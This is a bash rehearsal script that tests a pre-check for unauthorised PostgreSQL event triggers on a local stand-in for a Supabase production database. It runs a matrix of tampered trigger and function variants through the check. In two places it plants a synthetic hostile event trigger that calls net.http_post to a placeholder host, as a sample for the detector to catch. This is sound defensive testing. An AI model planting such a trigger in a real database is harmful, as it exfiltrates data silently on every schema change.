#!/bin/bash
# REHEARSAL - NEVER MERGE. S0B-ALLOWLIST: p9's pinned ensure_rls exception, proved on a real PostgreSQL 17 (macOS arm64 runner).
# REAL: the p9 SQL and the pre-check (byte-identical copies in ./pkg), the exact definition text of public.rls_auto_enable() as read from production
#       (definition.sql; platform code, no customer data), the darwin supabase-go v2.102.0 (dce26b75), the real migration chain 0001..0212 (d189768b).
# STUB: "production" is database postgres on 127.0.0.1 (--db-url via a wrapper). The six platform triggers are synthetic. The hostile trigger is synthetic.
#       PIN SUBSTITUTIONS in test copies only: GO_SHA and RUNNER_SHA (pre-check), SUPABASE_GO_SHA256 (runner). A diff proves they are the only differences.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
PKG="$HERE/pkg"
DRV="$HERE/driver.py"
W="${E2E_WORK:-$(mktemp -d "${TMPDIR:-/tmp}/s0ballow.XXXXXX")}"; mkdir -p "$W"; W="$(cd "$W" && pwd -P)"
H="$W/home"; ROOT="$H/hone-s1"; mkdir -p "$H"
STEPS="$W/steps.tsv"; : > "$STEPS"
pass=0; fail=0; CUR=setup
ok()  { pass=$((pass+1)); echo "ok   - $1"; printf '%s\tok\t%s\n' "$CUR" "$1" >> "$STEPS"; }
bad() { fail=$((fail+1)); echo "FAIL - $1"; [ -n "${2:-}" ] && echo "       $2"; printf '%s\tFAIL\t%s %s\n' "$CUR" "$1" "${2:-}" >> "$STEPS"; }
sha() { shasum -a 256 -- "$1" | cut -d' ' -f1; }
TOKEN="sbp_$(openssl rand -hex 20)"
PW_P=PW-PROD-91b3c7e2
NODEDIR="$(dirname "$(node -p process.execPath)")"
SAFEPATH="/usr/bin:/bin:/usr/local/bin:/opt/homebrew/bin:$NODEDIR"
PIN=99be20677b456ea8d3be47bdd44fb369

CUR=pkg
( cd "$PKG" && shasum -a 256 -c "$HERE/pkg.SHA256SUMS" >/dev/null 2>&1 ) && ok "the package copies in ./pkg match the recorded checksums" || bad "pkg checksums"
[ "$(sha "$PKG/run-window-read-macos.sh")" = 471ecb9d18116f9b5c898400d9dae0aa898be5aa795b2788c44eacdefeb27357 ] && ok "the runner copy is the pinned 471ecb9d" || bad "runner copy sha"
( cd "$PKG" && shasum -a 256 -c MANIFEST.sha256 >/dev/null 2>&1 ) && ok "the 19 pinned SQL files verify against MANIFEST.sha256 (incl. the new p9)" || bad "manifest"
/bin/bash -n "$PKG/s0b-precheck.sh" && ok "bash -n s0b-precheck.sh" || bad "bash -n precheck"

CUR=infra
B=$("$HERE/pg-setup.sh" "$W/pg" "$PW_P") || { echo "pg-setup failed"; tail -20 "$W/pg/pg.log" 2>/dev/null; exit 2; }
PSQLD() { local db=$1; shift; "$B/psql" -X -At -h "$W/pg" -p 55432 -U postgres -d "$db" -v ON_ERROR_STOP=1 "$@"; }
LOCALURL="postgresql://postgres.alhhybgqdmcdyzpybykj@127.0.0.1:55432/postgres?sslmode=require"
mkdir -p "$W/dl" && ( cd "$W/dl" && curl -fsSL -o cli.tgz https://github.com/supabase/cli/releases/download/v2.102.0/supabase_2.102.0_darwin_arm64.tar.gz && tar -xzf cli.tgz ) || { echo "could not fetch the CLI"; exit 2; }
REALBIN=""
for f in "$W/dl/"*; do [ -f "$f" ] && [ "$(sha "$f")" = dce26b75c9c233274239041b4e426821e7728f025a365e54ea2512df442e4b7b ] && REALBIN="$f"; done
[ -n "$REALBIN" ] && ok "the real darwin_arm64 supabase-go v2.102.0 hashes to the pinned dce26b75" || { bad "no member hashes to dce26b75"; exit 2; }
mkdir -p "$W/build/supabase/migrations" "$W/build/supabase/.temp" && tar -xf "$HERE/migrations-d189768b.tar" -C "$W/build"
for f in "$W/build/supabase/migrations/"*.sql; do v=$(basename "$f" | cut -c1-4); [ "$v" -gt 0212 ] && rm "$f"; done
printf 'v2.102.0\n' > "$W/build/supabase/.temp/cli-latest"
( cd "$W/build" && PGPASSWORD="$PW_P" SUPABASE_TELEMETRY_DISABLED=1 DO_NOT_TRACK=1 "$REALBIN" db push --db-url "$LOCALURL" --yes ) > "$W/build.log" 2>&1 || { echo "building 0212 failed"; tail -30 "$W/build.log"; exit 2; }
[ "$(PSQLD postgres -c "select count(*)||'|'||max(version) from supabase_migrations.schema_migrations")" = "211|0212" ] && ok "synthetic production is at 0212 after the real CLI applied the real chain" || { bad "build 0212"; exit 2; }
PSQLD postgres -f "$HERE/platform.sql" > "$W/platform.log" 2>&1 && ok "six platform-style event triggers (owner supabase_admin) created" || { bad "platform.sql" "$(tail -n 5 "$W/platform.log")"; exit 2; }

CUR=layout
mkdir -p "$ROOT/supabase-cli/real" "$ROOT/s0b" "$ROOT/_e2e"
cp "$REALBIN" "$ROOT/supabase-cli/real/supabase-go"; chmod 0755 "$ROOT/supabase-cli/real/supabase-go"
cp "$HERE/wrapper.sh" "$ROOT/supabase-cli/supabase-go"; chmod 0755 "$ROOT/supabase-cli/supabase-go"
GOSHA=$(sha "$ROOT/supabase-cli/supabase-go")
printf '%s\n' abcdefghijklmnopqrst > "$ROOT/e2e-restored-ref"; printf 'postgres\n' > "$ROOT/e2e-restored-db"; : > "$ROOT/e2e-calls.log"
sed "s/^SUPABASE_GO_SHA256=.*/SUPABASE_GO_SHA256=$GOSHA/" "$PKG/run-window-read-macos.sh" > "$ROOT/s0b/run-window-read-macos.sh"; chmod 0755 "$ROOT/s0b/run-window-read-macos.sh"
RSHA=$(sha "$ROOT/s0b/run-window-read-macos.sh")
for f in "$PKG"/p*.sql "$PKG"/v*.sql "$PKG/MANIFEST.sha256"; do cp "$f" "$ROOT/s0b/"; done
sed -e "s/^GO_SHA=.*/GO_SHA=$GOSHA/" -e "s/^RUNNER_SHA=.*/RUNNER_SHA=$RSHA/" "$PKG/s0b-precheck.sh" > "$ROOT/_e2e/s0b-precheck.sh"; chmod 0755 "$ROOT/_e2e/s0b-precheck.sh" "$ROOT" "$ROOT/s0b"
chk() { local d; d=$(diff "$1" "$2" | grep '^[<>]' | grep -Ev "$3" | wc -l | tr -d ' '); [ "$d" = 0 ] && ok "test copy of $(basename "$1") differs from the package only on its pin lines" || bad "test copy of $(basename "$1") differs elsewhere"; }
chk "$PKG/run-window-read-macos.sh" "$ROOT/s0b/run-window-read-macos.sh" '^[<>] SUPABASE_GO_SHA256='
chk "$PKG/s0b-precheck.sh" "$ROOT/_e2e/s0b-precheck.sh" '^[<>] (GO_SHA|RUNNER_SHA)='

# ------------------------------------------------------------------ the p9 matrix on the real SQL
CUR=p9
install_pin() { PSQLD postgres -f "$HERE/definition.sql" >/dev/null && PSQLD postgres -f "$HERE/trigger.sql" >/dev/null; }
reset_pin() {
  PSQLD postgres -c 'drop event trigger if exists zz_hostile' >/dev/null   # it would fire on the reset's own DDL and abort it
  PSQLD postgres -c 'alter extension pgcrypto drop function public.rls_auto_enable()' >/dev/null 2>&1 || true
  PSQLD postgres -c 'drop function if exists public.rls_auto_enable() cascade' >/dev/null
  PSQLD postgres -c 'drop schema if exists rh_s cascade' >/dev/null
  PSQLD postgres -c 'drop function if exists public.rh_other_fn() cascade' >/dev/null
  PSQLD postgres -c 'drop function if exists public.rh_hostile() cascade' >/dev/null
}
p9() { PSQLD postgres -F'|' -f "$PKG/p9-event-triggers.sql"; }   # all|other|pinned|md5|names
mkvar() { python3 - "$HERE/definition.sql" "$W/var.sql" "$1" <<'PY'
import sys
s = open(sys.argv[1]).read(); k = sys.argv[3]
if k == "byte": s = s.replace("\nEND;\n$function$", "\nEND; \n$function$")
elif k == "execute": s = s.replace("\nEND;\n$function$", "\nEXECUTE 'select 1';\nEND;\n$function$")
elif k == "invoker": s = s.replace(" SECURITY DEFINER\n", "")
elif k == "stable": s = s.replace(" LANGUAGE plpgsql\n", " LANGUAGE plpgsql\n STABLE\n")
elif k == "nocfg": s = s.replace(" SET search_path TO 'pg_catalog'\n", "")
elif k == "cfgother": s = s.replace("'pg_catalog'", "'public'")
elif k == "othersrc": s = "CREATE OR REPLACE FUNCTION public.rls_auto_enable()\n RETURNS event_trigger\n LANGUAGE plpgsql\n SECURITY DEFINER\n SET search_path TO 'pg_catalog'\nAS $function$\nBEGIN\n  NULL;\nEND;\n$function$;\n"
elif k == "schema": s = "create schema rh_s;\n" + s.replace("public.rls_auto_enable", "rh_s.rls_auto_enable")
else: raise SystemExit("unknown variant " + k)
open(sys.argv[2], "w").write(s)
PY
}
# case NAME EXPECT_OTHER EXPECT_PINNED SETUP...   (SETUP is a shell snippet run after reset+install)
case_() {
  local name=$1 eo=$2 ep=$3; shift 3
  reset_pin; install_pin || { bad "$name: install"; return; }
  local snip="$*" q="'"; snip="${snip//\~/$q}"
  eval "$snip" > "$W/case-$name.log" 2>&1 || { bad "$name: setup" "$(tail -n 3 "$W/case-$name.log")"; return; }
  local r; r=$(p9); local all other pinned; IFS='|' read -r all other pinned _ <<< "$r"
  if [ "$other" = "$eo" ] && [ "$pinned" = "$ep" ]; then ok "p9 $name: other=$other pinned=$ep (all=$all)$([ "$eo" -ge 1 ] && echo ' -> the pre-check would STOP')"; else bad "p9 $name" "got $r; want other=$eo pinned=$ep"; fi
}
swapfn() { PSQLD postgres -c 'drop function public.rls_auto_enable() cascade' >/dev/null && mkvar "$1" && PSQLD postgres -f "$W/var.sql" >/dev/null && PSQLD postgres -f "$HERE/trigger.sql" >/dev/null; }

reset_pin; install_pin
[ "$(PSQLD postgres -c "select md5(prosrc) from pg_proc where proname = 'rls_auto_enable'")" = "$PIN" ] && ok "the function created from the exact production definition text has md5(prosrc) = $PIN" || bad "md5 of the created function" "$(PSQLD postgres -c "select md5(prosrc) from pg_proc where proname = 'rls_auto_enable'")"
r=$(p9); IFS='|' read -r a o pn md rest <<< "$r"
[ "$a" = 7 ] && [ "$o" = 0 ] && [ "$pn" = 1 ] && [ "$md" = "$PIN" ] && [ "$rest" = 6 ] && ok "POSITIVE: 7 event triggers = six platform rows + ensure_rls: other=0, pinned=1, admitted md5=$md, exact platform names=6" || bad "positive p9" "$r"

case_ body_one_byte        1 0 'swapfn byte'
case_ second_execute       1 0 'swapfn execute'
case_ security_invoker     1 0 'swapfn invoker'
case_ volatility_stable    1 0 'swapfn stable'
case_ proconfig_missing    1 0 'swapfn nocfg'
case_ proconfig_different  1 0 'swapfn cfgother'
case_ right_name_other_source 1 0 'swapfn othersrc'
case_ trigger_disabled_D   1 0 'PSQLD postgres -c "alter event trigger ensure_rls disable"'
case_ trigger_always_A     1 0 'PSQLD postgres -c "alter event trigger ensure_rls enable always"'
case_ trigger_replica_R    1 0 'PSQLD postgres -c "alter event trigger ensure_rls enable replica"'
case_ event_sql_drop       1 0 'PSQLD postgres -c "drop event trigger ensure_rls" -c "create event trigger ensure_rls on sql_drop execute function public.rls_auto_enable()"'
case_ tags_missing_one     1 0 'PSQLD postgres -c "drop event trigger ensure_rls" -c "create event trigger ensure_rls on ddl_command_end when tag in (~CREATE TABLE~, ~CREATE TABLE AS~) execute function public.rls_auto_enable()"'
case_ tags_one_extra       1 0 'PSQLD postgres -c "drop event trigger ensure_rls" -c "create event trigger ensure_rls on ddl_command_end when tag in (~CREATE TABLE~, ~CREATE TABLE AS~, ~SELECT INTO~, ~ALTER TABLE~) execute function public.rls_auto_enable()"'
case_ tags_null_all_tags   1 0 'PSQLD postgres -c "drop event trigger ensure_rls" -c "create event trigger ensure_rls on ddl_command_end execute function public.rls_auto_enable()"'
case_ tags_reordered       1 0 'PSQLD postgres -c "drop event trigger ensure_rls" -c "create event trigger ensure_rls on ddl_command_end when tag in (~SELECT INTO~, ~CREATE TABLE AS~, ~CREATE TABLE~) execute function public.rls_auto_enable()"'
case_ trigger_owner_other  1 0 'PSQLD postgres -c "alter event trigger ensure_rls owner to rh_other"'
case_ function_owner_other 1 0 'PSQLD postgres -c "alter function public.rls_auto_enable() owner to rh_other"'
case_ other_schema         1 0 'PSQLD postgres -c "drop function public.rls_auto_enable() cascade" && mkvar schema && PSQLD postgres -f "$W/var.sql" && PSQLD postgres -c "create event trigger ensure_rls on ddl_command_end when tag in (~CREATE TABLE~, ~CREATE TABLE AS~, ~SELECT INTO~) execute function rh_s.rls_auto_enable()"'
case_ different_trigger_name_same_function 1 0 'PSQLD postgres -c "drop event trigger ensure_rls" -c "create event trigger ensure_rls_x on ddl_command_end when tag in (~CREATE TABLE~, ~CREATE TABLE AS~, ~SELECT INTO~) execute function public.rls_auto_enable()"'
case_ same_function_second_trigger 1 1 'PSQLD postgres -c "create event trigger ensure_rls_b on ddl_command_end when tag in (~CREATE TABLE~, ~CREATE TABLE AS~, ~SELECT INTO~) execute function public.rls_auto_enable()"'
case_ user_trigger_named_ensure_rls_other_function 1 0 'PSQLD postgres -c "drop function public.rls_auto_enable() cascade" -c "create function public.rh_other_fn() returns event_trigger language plpgsql security definer set search_path = pg_catalog as \$f\$ begin null; end \$f\$" -c "create event trigger ensure_rls on ddl_command_end when tag in (~CREATE TABLE~, ~CREATE TABLE AS~, ~SELECT INTO~) execute function public.rh_other_fn()"'
case_ hostile_net_http_post_still_stops 1 1 'PSQLD postgres -c "create function public.rh_hostile() returns event_trigger language plpgsql as \$f\$ begin perform net.http_post(url := ~https://example.invalid/x~); end \$f\$" -c "create event trigger zz_hostile on ddl_command_end execute function public.rh_hostile()"'
case_ extension_member_old_rule 0 0 'PSQLD postgres -c "alter extension pgcrypto add function public.rls_auto_enable()"'
reset_pin
r=$(p9); IFS='|' read -r a o pn md rest <<< "$r"
[ "$a" = 6 ] && [ "$o" = 0 ] && [ "$pn" = 0 ] && [ -z "$md" ] && [ "$rest" = 6 ] && ok "the six platform rows without the allowlist behave as before: all=6 other=0 pinned=0, no md5 (admitted by supabase_admin ownership)" || bad "six platform rows" "$r"
PSQLD postgres -c 'alter event trigger pgrst_ddl_watch owner to rh_other' -c 'alter function extensions.rh_noop() owner to rh_other' >/dev/null
r=$(p9); IFS='|' read -r a o pn md rest <<< "$r"
[ "$o" = 1 ] && ok "control: one platform row with its owner changed to a non-supabase role counts as other again (other=$o)" || bad "platform control" "$r"
PSQLD postgres -c 'alter event trigger pgrst_ddl_watch owner to supabase_admin' -c 'alter function extensions.rh_noop() owner to supabase_admin' >/dev/null

# ------------------------------------------------------------------ end to end through the real pre-check
CUR=precheck
drive() { RC=0; python3 "$DRV" "$W/$1.out" "$2" -- env -i PATH="$SAFEPATH" HOME="$H" TERM=dumb /bin/bash "$3" || RC=$?; OUT="$W/$1.out"; tr -d '\r' < "$OUT" > "$OUT.txt"; }
calls() { grep -c . "$ROOT/e2e-calls.log" | tr -d ' '; }
precheck() { { printf 'Supabase access token\t%s\n' "$TOKEN"; printf 'PRODUCTION database password\t%s\n' "$PW_P"; } > "$W/$1.ans"; C0=$(calls); drive "$1" "$W/$1.ans" "$ROOT/_e2e/s0b-precheck.sh"; DC=$(( $(calls) - C0 )); }
lastline() { tail -n 1 "$OUT.txt"; }
reset_pin; install_pin
precheck pre_pos
if [ "$RC" = 0 ] && [ "$DC" = 8 ] && [ "$(lastline)" = "S0B PRECHECK CLEAR" ] && grep -q "^pg_event_trigger: 7 (0 not platform by identity; 1 matched the pinned ensure_rls allowlist (admitted function md5: $PIN); 6 carry a usual platform name, information only)" "$OUT.txt" && ! grep -q '^ALERT' "$OUT.txt"; then
  ok "END TO END positive: the real pre-check prints the allowlisted count 1 and the admitted md5, no ALERT, exit 0, last line S0B PRECHECK CLEAR"
else bad "pre-check positive" "exit $RC, reads $DC; tail: $(tail -n 14 "$OUT.txt")"; fi
grep '^pg_event_trigger' "$OUT.txt" | sed 's/^/       /'
reset_pin; install_pin; swapfn byte
precheck pre_byte
if [ "$RC" != 0 ] && [ "$DC" = 8 ] && [ "$(lastline)" = "S0B PRECHECK STOP" ] && grep -q '^ALERT  1 event trigger(s) not owned by' "$OUT.txt" && grep -q 'matched the pinned ensure_rls allowlist (admitted function md5: none)' "$OUT.txt"; then
  ok "END TO END: ensure_rls whose body differs by one byte: ALERT, exit non-zero, last line S0B PRECHECK STOP, admitted md5 none"
else bad "pre-check one byte" "exit $RC, reads $DC; tail: $(tail -n 10 "$OUT.txt")"; fi
reset_pin; install_pin
PSQLD postgres -c "create function public.rh_hostile() returns event_trigger language plpgsql as \$f\$ begin perform net.http_post(url := 'https://example.invalid/x'); end \$f\$" -c "create event trigger zz_hostile on ddl_command_end execute function public.rh_hostile()" >/dev/null
precheck pre_host
if [ "$RC" != 0 ] && [ "$DC" = 8 ] && [ "$(lastline)" = "S0B PRECHECK STOP" ] && grep -q '^ALERT  1 event trigger(s) not owned by' "$OUT.txt"; then ok "END TO END: the hostile net.http_post event trigger beside a valid ensure_rls still STOPs"; else bad "pre-check hostile" "exit $RC, reads $DC; tail: $(tail -n 10 "$OUT.txt")"; fi
reset_pin
PSQLD postgres -c 'drop event trigger zz_hostile' >/dev/null 2>&1 || true

CUR=secrets
leak=0; for s in "$PW_P" "$TOKEN"; do if grep -rqF -- "$s" "$W"/*.out "$W"/*.out.txt 2>/dev/null; then leak=1; fi; done
[ "$leak" = 0 ] && ok "no password and no access token appears in any transcript" || bad "a secret appears in a transcript"
echo; echo "steps: $pass ok, $fail FAIL"
cp "$ROOT/e2e-calls.log" "$W/calls.log" 2>/dev/null || true
[ "$fail" = 0 ]
